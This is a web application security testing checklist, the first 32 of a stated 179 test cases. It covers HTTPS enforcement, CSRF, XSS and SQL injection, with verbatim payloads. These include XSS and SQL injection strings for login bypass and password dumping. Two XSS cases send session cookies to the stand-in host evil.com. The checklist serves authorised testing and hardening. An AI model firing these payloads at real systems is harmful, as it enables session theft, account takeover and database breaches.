# 20. Security Features — Checklist

Feature-area security **test cases** for “20. Security Features”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*179 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## SEC-001 — HTTP to HTTPS Redirect Verification
**Test Category:** Transport Security (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Access the application using HTTP (port 80). 2. Check if 301/302 redirect to HTTPS occurs. 3. Verify all subdomains also redirect. 4. Check if the redirect is permanent (301) not temporary (302). 5. Verify no sensitive data is exposed before redirect.

**Expected Result:** Application must immediately redirect all HTTP requests to HTTPS using a 301 permanent redirect without exposing any sensitive content over HTTP.

**Payload Example:**

```
curl -I http://target.com;curl -I http://www.target.com;curl -I http://api.target.com;curl -I http://admin.target.com
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** cURL;Burp Suite;SSLscan

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## SEC-002 — HSTS Header Verification
**Test Category:** Transport Security (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Access the application over HTTPS. 2. Check response headers for Strict-Transport-Security. 3. Verify max-age is at least 31536000 (1 year). 4. Check for includeSubDomains directive. 5. Check for preload directive. 6. Verify HSTS header is not set on HTTP responses.

**Expected Result:** Application must include Strict-Transport-Security header with adequate max-age and includeSubDomains directive on all HTTPS responses.

**Payload Example:**

```
Check for Strict-Transport-Security: max-age=31536000; includeSubDomains; preload in response headers
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** Burp Suite;SecurityHeaders.com;cURL

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## SEC-003 — TLS Version and Cipher Suite Assessment
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Scan the server for supported TLS versions. 2. Verify TLS 1.0 and 1.1 are disabled. 3. Check that only TLS 1.2 and TLS 1.3 are supported. 4. Verify weak cipher suites like RC4 and DES and 3DES and NULL are disabled. 5. Confirm forward secrecy ciphers are preferred.

**Expected Result:** Application must support only TLS 1.2+ with strong cipher suites and prefer forward secrecy ciphers while rejecting all legacy protocols.

**Payload Example:**

```
Test for SSLv2;SSLv3;TLS1.0;TLS1.1 acceptance;check for RC4;DES;3DES;NULL;EXPORT;anon cipher suites
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** SSLscan;testssl.sh;Nmap ssl-enum-ciphers;sslyze

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-004 — Mixed Content Detection
**Test Category:** Transport Security (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Browse all application pages over HTTPS. 2. Open browser developer console and check for mixed content warnings. 3. Inspect all resource loading for HTTP URLs. 4. Check dynamically loaded content. 5. Verify WebSocket connections use wss:// not ws://.

**Expected Result:** Application must serve all resources including images and scripts and stylesheets and fonts and APIs over HTTPS with no mixed content.

**Payload Example:**

```
Search page source for http:// references in src= and href= and action= and url( attributes on HTTPS pages
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** Browser DevTools;Burp Suite;Mixed Content Scanner

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## SEC-005 — SSL Certificate Validation
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Check SSL certificate validity period. 2. Verify certificate is issued by a trusted CA. 3. Check that certificate Common Name or SAN matches the domain. 4. Verify certificate chain is complete. 5. Check for certificate revocation status via OCSP/CRL. 6. Ensure no self-signed certificates in production.

**Expected Result:** Application must use a valid certificate from a trusted CA with proper domain matching and complete certificate chain.

**Payload Example:**

```
Check for expired certs;self-signed certs;hostname mismatch;incomplete chains;revoked certificates
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** SSLscan;testssl.sh;OpenSSL;Browser

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-006 — SSL Stripping Attack Test
**Test Category:** Transport Security (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Position as MITM between client and server. 2. Intercept HTTPS redirects and serve HTTP to the client. 3. Check if HSTS prevents the downgrade. 4. Test on first visit without HSTS preload. 5. Verify cookie security flags.

**Expected Result:** Application must implement HSTS with preloading and set Secure flag on all cookies to prevent SSL stripping attacks.

**Payload Example:**

```
Use sslstrip to intercept and downgrade HTTPS connections;verify HSTS preload status
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** sslstrip;mitmproxy;Bettercap;Wireshark

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## SEC-007 — TLS Renegotiation Vulnerability Test
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Test for client-initiated TLS renegotiation support. 2. Check for insecure renegotiation vulnerability. 3. Verify if renegotiation DoS is possible. 4. Test for CRIME and BREACH compression attacks.

**Expected Result:** Application must disable client-initiated renegotiation and support only secure renegotiation while disabling TLS compression.

**Payload Example:**

```
openssl s_client -connect target.com:443 then send R to test renegotiation;check for TLS compression
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** OpenSSL;testssl.sh;Nmap

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-008 — Certificate Pinning Verification
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. If the application is a mobile app or uses certificate pinning check pinning implementation. 2. Attempt to intercept traffic with a custom CA. 3. Verify if pinning can be bypassed. 4. Check for pin backup key.

**Expected Result:** Application must implement certificate pinning correctly in mobile apps and critical connections with backup pins for rotation.

**Payload Example:**

```
Attempt traffic interception with Burp CA;use Frida/Objection to bypass pinning;check for Public-Key-Pins header
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Burp Suite;Frida;Objection;Mobile Security Framework

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-009 — Insecure Protocol Fallback Test
**Test Category:** Transport Security (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Test if the server supports protocol downgrade via SCSV. 2. Check for POODLE vulnerability by testing SSLv3 fallback. 3. Verify TLS_FALLBACK_SCSV is supported. 4. Test for DROWN vulnerability on shared keys.

**Expected Result:** Application must support TLS_FALLBACK_SCSV and not allow protocol downgrade to insecure versions.

**Payload Example:**

```
Test for SSLv3 fallback;check DROWN;POODLE;BEAST;LUCKY13;Heartbleed vulnerabilities
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** testssl.sh;SSLscan;Nmap;OpenSSL

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## SEC-010 — Secure Cookie Flags Over HTTPS
**Test Category:** Session Management (WSTG-SESS-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** HTTPS Enforcement

**Test Steps:** 1. Login and inspect all cookies set by the application. 2. Verify each sensitive cookie has the Secure flag. 3. Check for HttpOnly flag on session cookies. 4. Verify SameSite attribute. 5. Check cookie scope.

**Expected Result:** All sensitive cookies must have Secure; HttpOnly; and SameSite=Strict or Lax flags set to prevent exposure over insecure channels.

**Payload Example:**

```
Check Set-Cookie headers for missing Secure;HttpOnly;SameSite attributes on session and authentication cookies
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** Burp Suite;Browser DevTools;EditThisCookie

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## SEC-011 — CSRF Token Presence Verification
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Navigate to all forms and state-changing operations. 2. Inspect each form for CSRF token presence. 3. Check AJAX requests for CSRF token in headers or body. 4. Verify tokens in multipart form submissions. 5. Identify any forms missing CSRF protection.

**Expected Result:** All state-changing requests must include a valid CSRF token either as a hidden form field or custom request header.

**Payload Example:**

```
Check all POST/PUT/DELETE forms for hidden input name=csrf_token or _token or X-CSRF-Token header in AJAX
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-012 — CSRF Token Validation Bypass via Empty Token
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Submit a state-changing request with a valid CSRF token. 2. Remove the CSRF token parameter entirely. 3. Submit with an empty CSRF token value. 4. Submit with csrf_token=null or csrf_token=undefined. 5. Check if the request is processed.

**Expected Result:** Application must reject all requests with missing or empty CSRF tokens for state-changing operations.

**Payload Example:**

```
Remove csrf_token parameter;set csrf_token=;csrf_token=null;csrf_token=undefined;csrf_token=0
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-013 — CSRF Token Reuse Across Sessions
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Login as User A and capture the CSRF token. 2. Logout and login as User B. 3. Use User A's CSRF token in User B's session. 4. Check if the request is accepted with a cross-session token.

**Expected Result:** CSRF tokens must be bound to the user's session and not be interchangeable between different sessions.

**Payload Example:**

```
Capture csrf_token from Session A;use in Session B's POST request;check if cross-session token is accepted
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-014 — CSRF Token Reuse After Expiry
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Capture a valid CSRF token. 2. Wait for an extended period beyond expected token lifetime. 3. Attempt to use the old token. 4. Check if expired tokens are still accepted. 5. Verify token rotation on use.

**Expected Result:** CSRF tokens must have a reasonable expiry and be invalidated after use or session change.

**Payload Example:**

```
Use captured csrf_token after 24+ hours;reuse same token for multiple requests without refreshing
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-015 — CSRF via HTTP Method Override
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Identify state-changing operations using POST. 2. Convert POST to GET request with same parameters. 3. Try HTTP method override headers like X-HTTP-Method-Override or _method. 4. Check if CSRF validation is bypassed for non-POST methods.

**Expected Result:** Application must enforce CSRF protection regardless of HTTP method and reject method override headers for security-critical operations.

**Payload Example:**

```
Convert POST /api/delete to GET /api/delete?id=1;add X-HTTP-Method-Override: POST to GET request;add _method=POST parameter
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-016 — CSRF Token in Cookie vs Header Mismatch
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Check if the application uses double-submit cookie pattern. 2. Modify the CSRF cookie value but keep the header value. 3. Modify the header value but keep the cookie. 4. Set both to the same arbitrary value. 5. Check validation logic.

**Expected Result:** Application must properly validate double-submit CSRF tokens by comparing cookie and header values using cryptographic binding to the session.

**Payload Example:**

```
Set CSRF cookie to value_A and header to value_B;set both to arbitrary same value like test123;check acceptance
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-017 — CSRF Protection Bypass via Content-Type Change
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Identify a JSON API endpoint with CSRF protection. 2. Change Content-Type from application/json to application/x-www-form-urlencoded. 3. Change to text/plain. 4. Change to multipart/form-data. 5. Check if CSRF validation varies by content type.

**Expected Result:** Application must enforce CSRF protection consistently regardless of Content-Type header and validate tokens for all content types.

**Payload Example:**

```
Change Content-Type: application/json to text/plain or application/x-www-form-urlencoded;submit same data without CSRF token
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Postman

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-018 — CSRF via Subdomain Cookie Injection
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. If CSRF uses double-submit cookie pattern check cookie domain scope. 2. Find XSS on any subdomain. 3. Inject CSRF cookie via subdomain XSS. 4. Craft CSRF attack using the injected cookie value.

**Expected Result:** Application must scope CSRF cookies to the specific domain and use server-side session binding for CSRF validation rather than relying solely on double-submit.

**Payload Example:**

```
Exploit XSS on subdomain to set document.cookie='csrf_token=attacker_value;domain=.target.com' then submit CSRF with matching header
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-019 — CSRF Token Predictability Assessment
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Collect multiple CSRF tokens from the application. 2. Analyze token format and entropy. 3. Check for sequential patterns or timestamp-based generation. 4. Attempt to predict the next token. 5. Verify cryptographic randomness.

**Expected Result:** CSRF tokens must be generated using cryptographically secure random number generators with sufficient entropy to prevent prediction.

**Payload Example:**

```
Collect 100+ CSRF tokens;analyze with Burp Sequencer;check entropy;test for predictable patterns
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite Sequencer;Custom Scripts

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-020 — SameSite Cookie Attribute Verification
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Check SameSite attribute on all session cookies. 2. Verify if SameSite=Strict or SameSite=Lax is set. 3. Test cross-site request behavior with different SameSite values. 4. Check for SameSite=None without Secure flag.

**Expected Result:** Session cookies must have SameSite=Strict or SameSite=Lax and if SameSite=None is required it must be paired with the Secure flag.

**Payload Example:**

```
Check Set-Cookie for SameSite attribute;test cross-site form submission behavior;verify SameSite=None;Secure
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-021 — Reflected XSS in URL Parameters
**Test Category:** Cross-Site Scripting (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Identify all URL parameters that reflect user input. 2. Inject basic XSS payloads in each parameter. 3. Test with event handlers and script tags and HTML injection. 4. Check various encoding contexts like HTML and attribute and JavaScript. 5. Test with WAF bypass payloads.

**Expected Result:** Application must encode all reflected output based on the rendering context and reject or sanitize malicious input.

**Payload Example:**

```
<script>alert(1)</script>;<img src=x onerror=alert(1)>;<svg/onload=alert(1)>;javascript:alert(1);"><script>alert(1)</script>;'-alert(1)-'
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter;Dalfox;XSStrike

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-022 — Stored XSS in User-Generated Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Identify all fields that store user input and display to other users. 2. Inject XSS payloads in each field. 3. Submit and view the content as another user. 4. Test in different rendering contexts. 5. Check admin panels viewing user data.

**Expected Result:** Application must sanitize all stored user content on input and encode on output to prevent stored XSS across all rendering contexts.

**Payload Example:**

```
<script>fetch('https://evil.com/?c='+document.cookie)</script>;<img src=x onerror=alert(document.domain)>;<svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter;BeEF

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-023 — DOM-Based XSS Detection
**Test Category:** Cross-Site Scripting (WSTG-CLNT-01) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Analyze JavaScript source code for DOM manipulation sinks. 2. Identify sources like location.hash and document.URL and window.name. 3. Test sinks like innerHTML and document.write and eval. 4. Craft payloads that flow from source to sink. 5. Test with hash-based and fragment-based payloads.

**Expected Result:** Application must avoid using dangerous DOM sinks with user-controlled data and implement proper DOM sanitization.

**Payload Example:**

```
https://target.com/page#<img src=x onerror=alert(1)>;javascript:void(document.location='https://evil.com/?c='+document.cookie)
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite DOM Invader;Browser DevTools;DOM XSS Scanner

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-024 — XSS Filter Bypass via Encoding
**Test Category:** Cross-Site Scripting (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Identify XSS filters in place. 2. Try HTML entity encoding bypasses. 3. Test URL encoding and double URL encoding. 4. Test Unicode encoding and UTF-7. 5. Try hex encoding and octal encoding. 6. Test null byte injection before payloads.

**Expected Result:** Application must decode all input layers before validation and apply context-aware output encoding to prevent encoding-based XSS bypasses.

**Payload Example:**

```
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;;%3Cscript%3Ealert(1)%3C/script%3E;%253Cscript%253E;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSStrike;Dalfox

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-025 — XSS in HTTP Headers
**Test Category:** Cross-Site Scripting (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Check if any HTTP response headers reflect user input. 2. Test Referer header reflection. 3. Test User-Agent header reflection. 4. Test custom headers for XSS. 5. Check for header injection leading to response splitting.

**Expected Result:** Application must sanitize all user-controlled values reflected in HTTP headers and prevent header injection.

**Payload Example:**

```
Set Referer: <script>alert(1)</script>;User-Agent: <img/src=x onerror=alert(1)>;X-Custom: test\r\nContent-Type: text/html
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;cURL

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-026 — XSS in File Upload Names
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Upload a file with XSS payload in the filename. 2. Check if the filename is reflected on the page without encoding. 3. Test with SVG files containing JavaScript. 4. Upload HTML files and access directly.

**Expected Result:** Application must sanitize uploaded filenames and serve user-uploaded content with Content-Type restrictions and Content-Disposition: attachment.

**Payload Example:**

```
Upload file named <script>alert(1)</script>.jpg;upload test.svg with embedded JavaScript;upload test.html with XSS
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Custom Files

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-027 — XSS via JSON Response Injection
**Test Category:** Cross-Site Scripting (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Identify JSON API responses that include user input. 2. Check Content-Type header for proper application/json. 3. Test if response can be rendered as HTML. 4. Inject HTML/JS in JSON values. 5. Check for JSONP endpoints.

**Expected Result:** Application must set Content-Type: application/json on all JSON responses and sanitize data values to prevent XSS if content type is misinterpreted.

**Payload Example:**

```
{"name":"<script>alert(1)</script>"};check JSONP callback for injection: callback=alert(1)//;test with X-Content-Type-Options: nosniff
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Postman

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-028 — XSS via Error Messages
**Test Category:** Cross-Site Scripting (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Trigger application errors with malicious input. 2. Check if error messages reflect the input without encoding. 3. Test 404 pages with XSS in the URL path. 4. Test validation error messages. 5. Check debug error pages.

**Expected Result:** Application must encode all error messages including reflected input to prevent XSS through error handling.

**Payload Example:**

```
Access /page/<script>alert(1)</script>;submit invalid data with XSS in field values;trigger stack traces with reflected input
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-029 — Mutation XSS (mXSS) Testing
**Test Category:** Cross-Site Scripting (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Identify fields sanitized by DOMPurify or similar libraries. 2. Test mutation XSS payloads that bypass sanitization through browser DOM mutation. 3. Test with nested tags that mutate during parsing. 4. Check for namespace confusion.

**Expected Result:** Application must use up-to-date sanitization libraries and test for mXSS vectors specific to the browser's HTML parser.

**Payload Example:**

```
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=x onerror=alert(1)&gt;">;noscript bypass payloads
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Browser DevTools;DOMPurify Bypass Lists

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-030 — XSS via WebSocket Messages
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Identify WebSocket connections that display messages in the DOM. 2. Send XSS payloads via WebSocket. 3. Check if incoming WebSocket messages are sanitized before DOM insertion. 4. Test real-time chat or notification features.

**Expected Result:** Application must sanitize all WebSocket message content before inserting into the DOM to prevent real-time XSS attacks.

**Payload Example:**

```
Send {"message":"<img src=x onerror=alert(document.cookie)>"} via WebSocket;inject <script> tags in WS messages
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;wscat;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-031 — Classic SQL Injection in GET Parameters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Identify all GET parameters. 2. Inject single quote and observe response. 3. Test with boolean-based payloads like OR 1=1 and OR 1=2. 4. Test with UNION SELECT statements. 5. Check for error-based injection. 6. Test time-based blind injection.

**Expected Result:** Application must use parameterized queries for all database operations and reject or sanitize SQL metacharacters in all inputs.

**Payload Example:**

```
id=1' OR '1'='1;id=1 UNION SELECT null,username,password FROM users--;id=1' AND SLEEP(5)--;id=1' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite;Havij

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-032 — SQL Injection in POST Parameters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Identify all POST request parameters. 2. Inject SQL payloads in each parameter. 3. Test login forms with authentication bypass payloads. 4. Test search functionality. 5. Test filter and sort parameters.

**Expected Result:** Application must use parameterized queries for all POST parameter processing and never concatenate user input into SQL queries.

**Payload Example:**

```
username=admin'--;password=' OR '1'='1;search=test' UNION SELECT table_name FROM information_schema.tables--;filter=price' OR 1=1--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

